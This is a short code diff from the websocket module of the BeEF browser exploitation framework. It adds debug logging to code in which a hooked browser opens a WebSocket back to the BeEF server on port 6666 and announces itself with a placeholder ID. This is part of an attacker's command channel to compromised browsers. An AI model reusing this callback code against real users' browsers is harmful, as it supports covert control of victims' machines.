@@ -17,9 +17,11 @@
 //beef.websocket.socket.send(take answer to server beef)
 /*New browser init call this */
 beef.websocket = {
+
     socket: null,
     /*websocket send Helo to beef server and start async communication*/
     start:function(){
+        console.log("started ws \n")
            /*server is always on ws.beefServer:6666*/
         var webSocketServer=beef.net.host; /*beefHost*/
         var webSocketPort=6666;
@@ -28,8 +30,9 @@ beef.websocket = {
           else
                this.socket = new WebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
            /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
-        this.socket.send("Helo"+"myid00");
 
+    this.socket.send("Helo"+"myid00");
+    console.log("Connected and Helo");
     }
 
 
